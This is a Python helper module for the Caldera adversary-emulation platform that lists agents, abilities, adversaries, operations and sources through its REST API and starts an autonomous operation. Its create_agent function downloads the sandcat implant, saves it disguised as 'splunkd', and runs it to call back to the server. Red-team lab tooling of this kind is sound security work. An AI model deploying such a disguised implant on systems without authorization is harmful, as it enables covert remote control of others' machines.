'''
responsible for api calls to caldera and processing outputs
'''
import os
import subprocess
import requests
import json
from dotenv import load_dotenv
load_dotenv()

#for wnen we add these to the env file
CALDERA_URL = os.getenv("CALDERA_URL", "http://localhost:8888")
API_KEY     = os.getenv("CALDERA_API_KEY")
HEADERS     = {"KEY": API_KEY, "Content-Type": "application/json"}
# Agents
def create_agent():
	url = f"{CALDERA_URL}/file/download"
	headers={
		"file":"sandcat.go",
		"platform":"linux"
}
	try:
		with requests.post(url,headers=headers,stream=True) as response:
			response.raise_for_status()
			with open ("splunkd", "wb") as f:
				for chunk in response.iter_content(chunk_size=8192):
					if chunk:
						f.write(chunk)
		os.chmod("splunkd",0o755)
		subprocess.Popen([
			"./splunkd",
			"-server", CALDERA_URL,
			"-group", "red",
			"-v"
])
	except Exception:
		return False
		
def show_agents():
	try:
		r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers = HEADERS, timeout=7)
		agents=r.json()
		print(f"{'PAW':<10} {'GROUP':<10} {'PLATFORM':<10}  {'ARCHITECTURE':<10} {'TRUSTED':<10} {'HOST':<10} {'USER':<10} {'STATUS':<10} {'IP'}")
		print ("-" * 100)
		for agent in agents:
			print(f"{agent['paw']:<10} {agent['group']:<10} {agent['platform']:<10} {agent['architecture']:<10} {agent['trusted']:<10} {agent['host']:<10} {agent['username']:<10} {agent['status']:<10} {agent['host_ip_addrs'][0]}")
	except Exception:
		return False

# Abilities
def show_abilities():
	try:
		r = requests.get(f"{CALDERA_URL}/api/v2/abilities", headers = HEADERS, timeout=7)
		abilities=r.json()
		for ability in abilities:
			platforms= list({e["platform"] for e in ability.get("executors", [])})
			print(f"""
NAME:		{ability['name']}
ABILITY ID: 	{ability['ability_id']}
TACTIC: 	{ability['tactic']}
TECHNIQUE NAME: {ability['technique_name']}
TECHNIQUE ID:	{ability['technique_id']}
DESCRIPTION:	{ability['description']}
PLATFORMS:	{", ".join(platforms)}
DELETE PAYLOAD: {ability['delete_payload']}
			""")
	except Exception:
		return False

# Adversaries (work in progress)
def show_adversaries():
	try:
		r = requests.get(f"{CALDERA_URL}/api/v2/adversaries", headers = HEADERS, timeout=7)
		adversaries=r.json()
		for adversary in adversaries:
			print(f"""
NAME:		{adversary['name']}
DESCRIPTION: 	{adversary['description']}
ADVERSARY ID: 	{adversary['adversary_id']}
ATOMIC ORDERING:{adversary['atomic_ordering']}
PLUGIN:		{adversary['plugin']}
			""")
	except Exception:
		return False

# Operations
def show_operations():
	try:
		r = requests.get(f"{CALDERA_URL}/api/v2/operations", headers = HEADERS, timeout=7)
		operations=r.json()
		for operation in operations:
			print ("-" * 235)
			print(f"""
NAME:		{operation['name']}
ID:		{operation['id']}
ADVERSARY: 	{operation['adversary']}
JITTER:		{operation['jitter']}
PLANNER:	{operation['planner']}
STATE:		{operation['state']}
OBFUSCATOR: 	{operation['obfuscator']}
AUTONOMOUS:	{operation['autonomous']}
AUTO-CLOSE:	{operation['auto_close']}
OBJECTIVE:	{operation['objective']}
USE LEARNNING PARSERES:	{operation['use_learning_parsers']}
SOURCE: 	{operation['source']}
			""")
	except Exception:
		return False
		
def create_operation():
	try:
		Payload={
			"name": "test6",
			"adversary" : {
				"adversary_id": "2346dbbc-9965-4380-bec3-689a291f43b6"
			},
			"planner": {
				"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"
			},
			"autonomous":1,
			"auto_close": False,
			"source": {
				"id": "ed32b9c3-9593-4c33-b0db-e2007315096b"
			}
		}	
		r=requests.post(f"{CALDERA_URL}/api/v2/operations", headers = HEADERS, json=Payload ,timeout=7)
	except Exception:
		return False
	
#Health
def health_check():
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/health", headers=HEADERS, timeout=7)
        return r.status_code == 200
    except Exception:
        return False

#Sources
def get_sources():
	try:
		r = requests.get(f"{CALDERA_URL}/api/v2/sources", headers = HEADERS, timeout=7)
		sources=r.json()
		for source in sources:
			print ("-" * 235)
			print(f"""
NAME:		{source['name']}
ID:		{source['id']}
			""")
	except Exception:
		return False

